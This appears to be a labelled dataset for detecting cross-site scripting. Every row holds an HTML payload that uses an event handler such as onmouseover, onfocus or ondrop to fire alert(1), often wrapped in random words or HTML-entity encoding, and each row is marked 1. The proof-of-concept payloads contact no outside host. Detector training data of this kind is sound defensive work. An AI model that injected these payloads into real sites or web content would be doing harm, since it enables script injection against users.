payload	xss
slang-whang <data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus> Samoset	1
oldermost <data onkeydown="alert(1)" contenteditable>test</data>	1
assurate &ltdata onkeypress="alert(1)" contenteditable>test&lt/data>	1
<data onkeyup="alert(1)" contenteditable>test</data>	1
old-gentlemanly <data onmousedown="alert(1)">test</data> Wrens	1
top-heavily &ltdata onmouseenter="alert(1)"&gttest&lt/data&gt vesiculous	1
brass-smith <data onmouseleave=&quotalert(1)&quot>test</data> internuncio	1
<data onmousemove=&quotalert(1)&quot>test</data>	1
hangover's &ltdata onmouseout="alert(1)">test&lt/data> Hyades	1
open-windowed <data onmouseover=&quotalert(1)&quot>test</data>	1
Greenway <data onmouseup="alert(1)">test</data> orthosilicic	1
&ltdata onpaste=&quotalert(1)&quot contenteditable&gttest&lt/data&gt	1
<datalist draggable="true" ondrag="alert(1)">test</datalist>	1
dust-brand &ltdatalist draggable="true" ondragend="alert(1)">test&lt/datalist> tootmoot	1
CAA <datalist draggable="true" ondragenter="alert(1)"&gttest</datalist&gt	1
hydroid &ltdatalist draggable="true" ondragleave="alert(1)">test&lt/datalist> Richet	1
sieveful &ltdatalist draggable="true" ondragstart="alert(1)">test&lt/datalist>	1
cadastrally <datalist id=x tabindex=1 onactivate=alert(1)></datalist> sniffling	1
<datalist id=x tabindex=1 onbeforeactivate=alert(1)&gt</datalist&gt	1
perihepatic <datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>	1
chicories <datalist id=x tabindex=1 ondeactivate=alert(1)&gt</datalist&gt<input id=y autofocus&gt postlegitimation	1
supracoxal <datalist id=x tabindex=1 onfocus=alert(1)></datalist>	1
&ltdatalist id=x tabindex=1 onfocusin=alert(1)>&lt/datalist>	1
<datalist onbeforecopy="alert(1)" contenteditable>test</datalist>	1
rheologists <datalist onbeforecut="alert(1)" contenteditable>test</datalist> antivivisectionist	1
&ltdatalist onbeforepaste="alert(1)" contenteditable>test&lt/datalist>	1
<datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>	1
neuromatosis <datalist onclick=&quotalert(1)&quot>test</datalist>	1
<datalist oncontextmenu=&quotalert(1)&quot>test</datalist>	1
eavesdrop <datalist oncopy="alert(1)" contenteditable>test</datalist>	1
&ltdatalist oncut="alert(1)" contenteditable&gttest&lt/datalist&gt	1
<datalist ondblclick=&quotalert(1)&quot>test</datalist>	1
<datalist onfocusout=alert(1) tabindex=1 id=x&gt</datalist&gt<input autofocus&gt	1
phylaxis <datalist onkeydown="alert(1)" contenteditable>test</datalist> Alberto	1
wonder-working &ltdatalist onkeypress="alert(1)" contenteditable>test&lt/datalist>	1
trihedra &ltdatalist onkeyup=&quotalert(1)&quot contenteditable>test&lt/datalist> biographically	1
<datalist onmousedown="alert(1)">test</datalist>	1
&ltdatalist onmouseenter="alert(1)">test&lt/datalist>	1
<datalist onmouseleave="alert(1)"&gttest</datalist&gt	1
supersensuous <datalist onmousemove="alert(1)">test</datalist> inspanned	1
evilly &ltdatalist onmouseout=&quotalert(1)&quot&gttest&lt/datalist&gt	1
<datalist onmouseover="alert(1)">test</datalist>	1
<datalist onmouseup=&quotalert(1)&quot>test</datalist>	1
dyestuff &ltdatalist onpaste="alert(1)" contenteditable>test&lt/datalist>	1
gazeless &ltdd draggable="true" ondrag="alert(1)">test&lt/dd> teetertail	1
cotton-wicked &ltdd draggable="true" ondragend="alert(1)">test&lt/dd> wiving	1
ufer <dd draggable="true" ondragenter="alert(1)"&gttest</dd&gt	1
<dd draggable="true" ondragleave="alert(1)">test</dd>	1
&ltdd draggable="true" ondragstart="alert(1)">test&lt/dd>	1
tifter <dd id=x tabindex=1 onactivate=alert(1)&gt</dd&gt	1
placket <dd id=x tabindex=1 onbeforeactivate=alert(1)></dd> skulduggery	1
Dulce &ltdd id=x tabindex=1 onbeforedeactivate=alert(1)>&lt/dd>&ltinput autofocus> CRT	1
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>	1
duarchy <dd id=x tabindex=1 onfocus=alert(1)></dd>	1
&ltdd id=x tabindex=1 onfocusin=alert(1)>&lt/dd>	1
melanospermous <dd onbeforecopy=&quotalert(1)&quot contenteditable>test</dd> curdoo	1
phenates &ltdd onbeforecut="alert(1)" contenteditable>test&lt/dd> jampan	1
tessaraglot <dd onbeforepaste="alert(1)" contenteditable&gttest</dd&gt chainless	1
<dd onblur=alert(1) tabindex=1 id=x&gt</dd&gt<input autofocus&gt	1
stork&quots-bill <dd onclick="alert(1)">test</dd>	1
creekside &ltdd oncontextmenu="alert(1)">test&lt/dd>	1
Laks <dd oncopy="alert(1)" contenteditable&gttest</dd&gt beltcourse	1
radioisotope <dd oncut="alert(1)" contenteditable&gttest</dd&gt buffi	1
prechoosing <dd ondblclick="alert(1)">test</dd> Escoffier	1
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>	1
&ltdd onkeydown="alert(1)" contenteditable>test&lt/dd>	1
retrofired <dd onkeypress="alert(1)" contenteditable>test</dd> supple-visaged	1
mesoseismal <dd onkeyup="alert(1)" contenteditable&gttest</dd&gt	1
Cordula &ltdd onmousedown="alert(1)"&gttest&lt/dd&gt	1
pyritization <dd onmouseenter="alert(1)">test</dd> wrigglesome	1
cathection <dd onmouseleave=&quotalert(1)&quot&gttest</dd&gt	1
<dd onmousemove=&quotalert(1)&quot>test</dd>	1
<dd onmouseout="alert(1)">test</dd>	1
nonrationalized <dd onmouseover="alert(1)">test</dd>	1
&ltdd onmouseup=&quotalert(1)&quot>test&lt/dd>	1
<dd onpaste="alert(1)" contenteditable>test</dd>	1
&ltdel draggable="true" ondrag="alert(1)">test&lt/del>	1
<del draggable="true" ondragend="alert(1)">test</del>	1
ululations &ltdel draggable="true" ondragenter="alert(1)">test&lt/del>	1
regelation <del draggable="true" ondragleave="alert(1)">test</del> cockroaches	1
&ltdel draggable="true" ondragstart="alert(1)">test&lt/del>	1
self-lover &ltdel id=x tabindex=1 onactivate=alert(1)>&lt/del> uncontrollability	1
enamelware <del id=x tabindex=1 onbeforeactivate=alert(1)></del> provoquant	1
untop &ltdel id=x tabindex=1 onbeforedeactivate=alert(1)&gt&lt/del&gt&ltinput autofocus&gt	1
Pterichthyodes <del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus> trisinuated	1
&ltdel id=x tabindex=1 onfocus=alert(1)&gt&lt/del&gt	1
enjoyingly <del id=x tabindex=1 onfocusin=alert(1)></del>	1
Bergen <del onbeforecopy=&quotalert(1)&quot contenteditable>test</del>	1
<del onbeforecut="alert(1)" contenteditable&gttest</del&gt	1
protend <del onbeforepaste="alert(1)" contenteditable>test</del>	1
locksteps <del onblur=alert(1) tabindex=1 id=x&gt</del&gt<input autofocus&gt autonomize	1
opprobriousness <del onclick=&quotalert(1)&quot&gttest</del&gt	1
wig-wag <del oncontextmenu=&quotalert(1)&quot>test</del> swankiness	1
exscript <del oncopy="alert(1)" contenteditable&gttest</del&gt Philo-slav	1
<del oncut="alert(1)" contenteditable>test</del>	1
nonmedical <del ondblclick="alert(1)">test</del>	1
determinability &ltdel onfocusout=alert(1) tabindex=1 id=x>&lt/del>&ltinput autofocus>	1
frequency-modulated <del onkeydown="alert(1)" contenteditable>test</del>	1
muddy <del onkeypress="alert(1)" contenteditable&gttest</del&gt	1
&ltdel onkeyup="alert(1)" contenteditable>test&lt/del>	1
chinks <del onmousedown=&quotalert(1)&quot>test</del>	1
lymphocytopenia <del onmouseenter="alert(1)">test</del> Even	1
<del onmouseleave="alert(1)">test</del>	1
Allie &ltdel onmousemove="alert(1)">test&lt/del>	1
&ltdel onmouseout="alert(1)"&gttest&lt/del&gt	1
outstudent <del onmouseover="alert(1)"&gttest</del&gt	1
&ltdel onmouseup=&quotalert(1)&quot>test&lt/del>	1
mother-of-thyme <del onpaste="alert(1)" contenteditable>test</del>	1
laughterless <details draggable=&quottrue&quot ondrag=&quotalert(1)&quot>test</details> supersubsist	1
&ltdetails draggable="true" ondragend="alert(1)">test&lt/details>	1
<details draggable="true" ondragenter="alert(1)">test</details>	1
actualising &ltdetails draggable="true" ondragleave="alert(1)">test&lt/details> soliform	1
albify <details draggable="true" ondragstart="alert(1)">test</details>	1
Savadove <details id=x tabindex=1 onactivate=alert(1)&gt</details&gt	1
affixment &ltdetails id=x tabindex=1 onbeforeactivate=alert(1)>&lt/details>	1
&ltdetails id=x tabindex=1 onbeforedeactivate=alert(1)>&lt/details>&ltinput autofocus>	1
tetrarchate <details id=x tabindex=1 ondeactivate=alert(1)&gt</details&gt<input id=y autofocus&gt Aselline	1
Helianthoidea &ltdetails id=x tabindex=1 onfocus=alert(1)>&lt/details>	1
straight <details id=x tabindex=1 onfocusin=alert(1)&gt</details&gt	1
resizes <details onbeforecopy="alert(1)" contenteditable>test</details> nundine	1
Lynden <details onbeforecut="alert(1)" contenteditable>test</details>	1
<details onbeforepaste="alert(1)" contenteditable&gttest</details&gt	1
<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>	1
&ltdetails onclick=&quotalert(1)&quot>test&lt/details>	1
alloantibody &ltdetails oncontextmenu="alert(1)"&gttest&lt/details&gt	1
parapphyllia <details oncopy=&quotalert(1)&quot contenteditable>test</details>	1
subtwined <details oncut="alert(1)" contenteditable&gttest</details&gt authoritarianisms	1
&ltdetails ondblclick="alert(1)">test&lt/details>	1
watape <details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>	1
nilgaus &ltdetails onkeydown="alert(1)" contenteditable>test&lt/details> sepawn	1
benzanalgen <details onkeypress="alert(1)" contenteditable>test</details>	1
nuagism <details onkeyup="alert(1)" contenteditable>test</details>	1
hypostasise &ltdetails onmousedown="alert(1)">test&lt/details>	1
nonerrant &ltdetails onmouseenter="alert(1)">test&lt/details>	1
<details onmouseleave="alert(1)"&gttest</details&gt	1
workbooks <details onmousemove=&quotalert(1)&quot>test</details>	1
Mithraitic &ltdetails onmouseout="alert(1)">test&lt/details> balli	1
nonflowering <details onmouseover=&quotalert(1)&quot>test</details>	1
<details onmouseup="alert(1)"&gttest</details&gt	1
resettings <details onpaste="alert(1)" contenteditable&gttest</details&gt Kelcey	1
<details ontoggle=alert(1) open&gttest</details&gt	1
rhynchocephalian <dfn draggable="true" ondrag="alert(1)">test</dfn>	1
hedgehogs <dfn draggable="true" ondragend="alert(1)">test</dfn> mermen	1
table-talk <dfn draggable=&quottrue&quot ondragenter=&quotalert(1)&quot>test</dfn>	1
<dfn draggable="true" ondragleave="alert(1)">test</dfn>	1
mooing <dfn draggable="true" ondragstart="alert(1)">test</dfn>	1
Maryville <dfn id=x tabindex=1 onactivate=alert(1)&gt</dfn&gt	1
&ltdfn id=x tabindex=1 onbeforeactivate=alert(1)>&lt/dfn>	1
thermophobia <dfn id=x tabindex=1 onbeforedeactivate=alert(1)&gt</dfn&gt<input autofocus&gt greenage	1
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>	1
halieutically &ltdfn id=x tabindex=1 onfocus=alert(1)&gt&lt/dfn&gt demanders	1
Marge <dfn id=x tabindex=1 onfocusin=alert(1)&gt</dfn&gt nondiagrammatical	1
hellship &ltdfn onbeforecopy="alert(1)" contenteditable>test&lt/dfn>	1
populaces <dfn onbeforecut="alert(1)" contenteditable>test</dfn>	1
chary &ltdfn onbeforepaste="alert(1)" contenteditable>test&lt/dfn> garglers	1
showmanism <dfn onblur=alert(1) tabindex=1 id=x&gt</dfn&gt<input autofocus&gt morpholine	1
<dfn onclick="alert(1)">test</dfn>	1
intussusceptive <dfn oncontextmenu="alert(1)">test</dfn>	1
disenfranchises &ltdfn oncopy="alert(1)" contenteditable>test&lt/dfn> undigested	1
spermatogenesis <dfn oncut=&quotalert(1)&quot contenteditable&gttest</dfn&gt rebut	1
&ltdfn ondblclick="alert(1)"&gttest&lt/dfn&gt	1
uninvaginated <dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus> respond	1
steam-driven &ltdfn onkeydown="alert(1)" contenteditable>test&lt/dfn>	1
<dfn onkeypress=&quotalert(1)&quot contenteditable>test</dfn>	1
<dfn onkeyup="alert(1)" contenteditable>test</dfn>	1
unborrowing <dfn onmousedown="alert(1)"&gttest</dfn&gt suprachoroidea	1
naveled &ltdfn onmouseenter="alert(1)">test&lt/dfn>	1
<dfn onmouseleave=&quotalert(1)&quot>test</dfn>	1
Hydrophyllaceae &ltdfn onmousemove=&quotalert(1)&quot>test&lt/dfn> interassure	1
ulluco <dfn onmouseout=&quotalert(1)&quot>test</dfn>	1
&ltdfn onmouseover="alert(1)"&gttest&lt/dfn&gt	1
melancholy <dfn onmouseup="alert(1)">test</dfn> kinescoped	1
<dfn onpaste=&quotalert(1)&quot contenteditable>test</dfn>	1
bleat &ltdialog draggable=&quottrue&quot ondrag=&quotalert(1)&quot>test&lt/dialog>	1
lithium &ltdialog draggable="true" ondragend="alert(1)"&gttest&lt/dialog&gt	1
&ltdialog draggable=&quottrue&quot ondragenter=&quotalert(1)&quot&gttest&lt/dialog&gt	1
forecaddie <dialog draggable="true" ondragleave="alert(1)">test</dialog>	1
<dialog draggable=&quottrue&quot ondragstart=&quotalert(1)&quot>test</dialog>	1
molted <dialog id=x tabindex=1 onactivate=alert(1)></dialog> Actinia	1
nonadopter <dialog id=x tabindex=1 onbeforeactivate=alert(1)&gt</dialog&gt	1
abearance &ltdialog id=x tabindex=1 onbeforedeactivate=alert(1)>&lt/dialog>&ltinput autofocus>	1
cannaled <dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>	1
stodging &ltdialog id=x tabindex=1 onfocus=alert(1)&gt&lt/dialog&gt	1
pestersome <dialog id=x tabindex=1 onfocusin=alert(1)></dialog> burgul	1
juglandin <dialog onbeforecopy="alert(1)" contenteditable>test</dialog> Leonardi	1
<dialog onbeforecut="alert(1)" contenteditable>test</dialog>	1
germanous &ltdialog onbeforepaste=&quotalert(1)&quot contenteditable>test&lt/dialog> necrosing	1
&ltdialog onblur=alert(1) tabindex=1 id=x&gt&lt/dialog&gt&ltinput autofocus&gt	1
disconcerted <dialog onclick="alert(1)"&gttest</dialog&gt	1
sophene <dialog oncontextmenu=&quotalert(1)&quot>test</dialog> Adolf	1
motoring &ltdialog oncopy="alert(1)" contenteditable>test&lt/dialog>	1
<dialog oncut="alert(1)" contenteditable&gttest</dialog&gt	1
flooded &ltdialog ondblclick="alert(1)">test&lt/dialog>	1
Kondon <dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>	1
&ltdialog onkeydown="alert(1)" contenteditable&gttest&lt/dialog&gt	1
&ltdialog onkeypress=&quotalert(1)&quot contenteditable>test&lt/dialog>	1
miswisdom &ltdialog onkeyup="alert(1)" contenteditable>test&lt/dialog>	1
<dialog onmousedown=&quotalert(1)&quot>test</dialog>	1
impoundage <dialog onmouseenter="alert(1)"&gttest</dialog&gt trituration	1
<dialog onmouseleave="alert(1)"&gttest</dialog&gt	1
biked <dialog onmousemove="alert(1)">test</dialog>	1
<dialog onmouseout=&quotalert(1)&quot>test</dialog>	1
Borrow &ltdialog onmouseover="alert(1)">test&lt/dialog> nonappendicular	1
<dialog onmouseup=&quotalert(1)&quot&gttest</dialog&gt	1
spheniscomorph <dialog onpaste="alert(1)" contenteditable>test</dialog>	1
paragastric <dir draggable=&quottrue&quot ondrag=&quotalert(1)&quot>test</dir>	1
<dir draggable="true" ondragend="alert(1)">test</dir>	1
denouncers <dir draggable=&quottrue&quot ondragenter=&quotalert(1)&quot>test</dir>	1
&ltdir draggable="true" ondragleave="alert(1)">test&lt/dir>	1
&ltdir draggable="true" ondragstart="alert(1)"&gttest&lt/dir&gt	1
Cottonport <dir id=x tabindex=1 onactivate=alert(1)></dir>	1
<dir id=x tabindex=1 onbeforeactivate=alert(1)></dir>	1
&ltdir id=x tabindex=1 onbeforedeactivate=alert(1)>&lt/dir>&ltinput autofocus>	1
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>	1
Sabir <dir id=x tabindex=1 onfocus=alert(1)></dir>	1
<dir id=x tabindex=1 onfocusin=alert(1)></dir>	1
Cyclopes &ltdir onbeforecopy="alert(1)" contenteditable>test&lt/dir>	1
&ltdir onbeforecut="alert(1)" contenteditable&gttest&lt/dir&gt	1
Liebeslied &ltdir onbeforepaste="alert(1)" contenteditable>test&lt/dir>	1
Bion <dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>	1
&ltdir onclick="alert(1)"&gttest&lt/dir&gt	1
transmit-receiver &ltdir oncontextmenu="alert(1)">test&lt/dir>	1
speil <dir oncopy="alert(1)" contenteditable>test</dir>	1
Bhavabhuti <dir oncut="alert(1)" contenteditable>test</dir>	1
prestandard &ltdir ondblclick=&quotalert(1)&quot>test&lt/dir>	1
predecide <dir onfocusout=alert(1) tabindex=1 id=x&gt</dir&gt<input autofocus&gt	1
pseudoimpartial &ltdir onkeydown="alert(1)" contenteditable&gttest&lt/dir&gt	1
<dir onkeypress="alert(1)" contenteditable&gttest</dir&gt	1
&ltdir onkeyup="alert(1)" contenteditable>test&lt/dir>	1
hominal <dir onmousedown="alert(1)">test</dir>	1
Winfield <dir onmouseenter="alert(1)"&gttest</dir&gt	1
<dir onmouseleave="alert(1)"&gttest</dir&gt	1
<dir onmousemove=&quotalert(1)&quot>test</dir>	1
husbandless <dir onmouseout="alert(1)"&gttest</dir&gt	1
<dir onmouseover="alert(1)">test</dir>	1
Christ-imitating <dir onmouseup="alert(1)">test</dir> peepuls	1
<dir onpaste=&quotalert(1)&quot contenteditable>test</dir>	1
chorometry <div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>	1
predivided <div draggable="true" contenteditable&gtdrag me</div&gt<a ondrop=alert(1) contenteditable&gtdrop here</a&gt	1
scull &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltabbr ondragover=alert(1) contenteditable>drop here&lt/abbr> Coryphaena	1
samba <div draggable=&quottrue&quot contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>	1
<div draggable="true" contenteditable&gtdrag me</div&gt<acronym ondragover=alert(1) contenteditable&gtdrop here</acronym&gt	1
armourer &ltdiv draggable=&quottrue&quot contenteditable>drag me&lt/div>&ltacronym ondrop=alert(1) contenteditable>drop here&lt/acronym>	1
internescine &ltdiv draggable=&quottrue&quot contenteditable>drag me&lt/div>&ltaddress ondragover=alert(1) contenteditable>drop here&lt/address>	1
unare <div draggable=&quottrue&quot contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address> nictates	1
cathexis <div draggable="true" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet> antimonarchistic	1
<div draggable="true" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>	1
<div draggable="true" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>	1
<div draggable="true" contenteditable&gtdrag me</div&gt<area ondrop=alert(1) contenteditable&gtdrop here</area&gt	1
caperbush &ltdiv draggable=&quottrue&quot contenteditable>drag me&lt/div>&ltarticle ondragover=alert(1) contenteditable>drop here&lt/article> Audhumla	1
thioneine <div draggable=&quottrue&quot contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article> sooty-faced	1
rheumaticky <div draggable="true" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside> unsophisticated	1
dicycle <div draggable="true" contenteditable&gtdrag me</div&gt<aside ondrop=alert(1) contenteditable&gtdrop here</aside&gt	1
<div draggable="true" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>	1
Spanioli &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltaudio ondrop=alert(1) contenteditable>drop here&lt/audio> watchmanly	1
scaldino &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltb ondragover=alert(1) contenteditable>drop here&lt/b> victualless	1
precatively <div draggable=&quottrue&quot contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>	1
pelvimetry &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltbase ondragover=alert(1) contenteditable>drop here&lt/base>	1
&ltdiv draggable="true" contenteditable>drag me&lt/div>&ltbase ondrop=alert(1) contenteditable>drop here&lt/base>	1
<div draggable="true" contenteditable&gtdrag me</div&gt<basefont ondragover=alert(1) contenteditable&gtdrop here</basefont&gt	1
silver-golden <div draggable="true" contenteditable&gtdrag me</div&gt<basefont ondrop=alert(1) contenteditable&gtdrop here</basefont&gt coevality	1
array &ltdiv draggable="true" contenteditable&gtdrag me&lt/div&gt&ltbdi ondragover=alert(1) contenteditable&gtdrop here&lt/bdi&gt imaginings	1
fetes <div draggable="true" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>	1
nonascendant &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltbdo ondragover=alert(1) contenteditable>drop here&lt/bdo> weddedness	1
polypragmonist <div draggable="true" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>	1
radioisotope &ltdiv draggable=&quottrue&quot contenteditable>drag me&lt/div>&ltbgsound ondragover=alert(1) contenteditable>drop here&lt/bgsound> invented	1
&ltdiv draggable="true" contenteditable>drag me&lt/div>&ltbgsound ondrop=alert(1) contenteditable>drop here&lt/bgsound>	1
&ltdiv draggable="true" contenteditable>drag me&lt/div>&ltbig ondragover=alert(1) contenteditable>drop here&lt/big>	1
mixture &ltdiv draggable="true" contenteditable&gtdrag me&lt/div&gt&ltbig ondrop=alert(1) contenteditable&gtdrop here&lt/big&gt	1
squishing &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltblink ondragover=alert(1) contenteditable>drop here&lt/blink>	1
tarre <div draggable="true" contenteditable&gtdrag me</div&gt<blink ondrop=alert(1) contenteditable&gtdrop here</blink&gt	1
phoenicaceous <div draggable=&quottrue&quot contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>	1
r-RNA <div draggable="true" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable>drop here</blockquote>	1
transmissions <div draggable=&quottrue&quot contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>	1
Brioni &ltdiv draggable="true" contenteditable&gtdrag me&lt/div&gt&ltbody ondrop=alert(1) contenteditable&gtdrop here&lt/body&gt obligable	1
concentre &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltbr ondragover=alert(1) contenteditable>drop here&lt/br> paroophoric	1
&ltdiv draggable="true" contenteditable>drag me&lt/div>&ltbr ondrop=alert(1) contenteditable>drop here&lt/br>	1
wolf-eel <div draggable=&quottrue&quot contenteditable&gtdrag me</div&gt<button ondragover=alert(1) contenteditable&gtdrop here</button&gt	1
photochemically <div draggable=&quottrue&quot contenteditable&gtdrag me</div&gt<button ondrop=alert(1) contenteditable&gtdrop here</button&gt moolings	1
unamazedness &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltcanvas ondragover=alert(1) contenteditable>drop here&lt/canvas>	1
&ltdiv draggable="true" contenteditable>drag me&lt/div>&ltcanvas ondrop=alert(1) contenteditable>drop here&lt/canvas>	1
batfowling &ltdiv draggable=&quottrue&quot contenteditable>drag me&lt/div>&ltcaption ondragover=alert(1) contenteditable>drop here&lt/caption>	1
<div draggable="true" contenteditable&gtdrag me</div&gt<caption ondrop=alert(1) contenteditable&gtdrop here</caption&gt	1
<div draggable="true" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>	1
<div draggable="true" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>	1
<div draggable="true" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>	1
transvenom <div draggable=&quottrue&quot contenteditable&gtdrag me</div&gt<cite ondrop=alert(1) contenteditable&gtdrop here</cite&gt roof-tree	1
minatorially <div draggable="true" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code> propitiatory	1
<div draggable="true" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>	1
<div draggable="true" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>	1
complexness <div draggable=&quottrue&quot contenteditable&gtdrag me</div&gt<col ondrop=alert(1) contenteditable&gtdrop here</col&gt	1
dodecahedron &ltdiv draggable=&quottrue&quot contenteditable&gtdrag me&lt/div&gt&ltcolgroup ondragover=alert(1) contenteditable&gtdrop here&lt/colgroup&gt econometrical	1
<div draggable="true" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>	1
&ltdiv draggable=&quottrue&quot contenteditable>drag me&lt/div>&ltcommand ondragover=alert(1) contenteditable>drop here&lt/command>	1
headtire <div draggable="true" contenteditable&gtdrag me</div&gt<command ondrop=alert(1) contenteditable&gtdrop here</command&gt spanemia	1
<div draggable=&quottrue&quot contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>	1
misknown &ltdiv draggable="true" contenteditable&gtdrag me&lt/div&gt&ltcontent ondrop=alert(1) contenteditable&gtdrop here&lt/content&gt ladies-in-waiting	1
multiphasic <div draggable="true" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>	1
Somerton <div draggable="true" contenteditable&gtdrag me</div&gt<data ondrop=alert(1) contenteditable&gtdrop here</data&gt	1
preassigned &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltdatalist ondragover=alert(1) contenteditable>drop here&lt/datalist>	1
<div draggable="true" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>	1
choltry <div draggable=&quottrue&quot contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>	1
Ilysanthes <div draggable="true" contenteditable&gtdrag me</div&gt<dd ondrop=alert(1) contenteditable&gtdrop here</dd&gt	1
&ltdiv draggable="true" contenteditable>drag me&lt/div>&ltdel ondragover=alert(1) contenteditable>drop here&lt/del>	1
video <div draggable=&quottrue&quot contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>	1
<div draggable="true" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>	1
headwards <div draggable="true" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details> cerebration	1
<div draggable="true" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable>drop here</dfn>	1
chequer <div draggable="true" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn> eupnoeic	1
<div draggable=&quottrue&quot contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>	1
metricity <div draggable=&quottrue&quot contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>	1
ornithocopros &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltdir ondragover=alert(1) contenteditable>drop here&lt/dir>	1
prerecommend <div draggable="true" contenteditable&gtdrag me</div&gt<dir ondrop=alert(1) contenteditable&gtdrop here</dir&gt	1
becroak <div draggable=&quottrue&quot contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div> formula	1
<div draggable=&quottrue&quot contenteditable&gtdrag me</div&gt<div ondrop=alert(1) contenteditable&gtdrop here</div&gt	1
Blaew <div draggable="true" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>	1
&ltdiv draggable="true" contenteditable>drag me&lt/div>&ltdl ondrop=alert(1) contenteditable>drop here&lt/dl>	1
detrudes &ltdiv draggable="true" contenteditable>drag me&lt/div>&ltdt ondragover=alert(1) contenteditable>drop here&lt/dt> malobservation	1
xenophobe <div draggable=&quottrue&quot contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt> dynamoelectric	1
dambonitol &ltdiv draggable="true" contenteditable&gtdrag me&lt/div&gt&ltelement ondragover=alert(1) contenteditable&gtdrop here&lt/element&gt	1
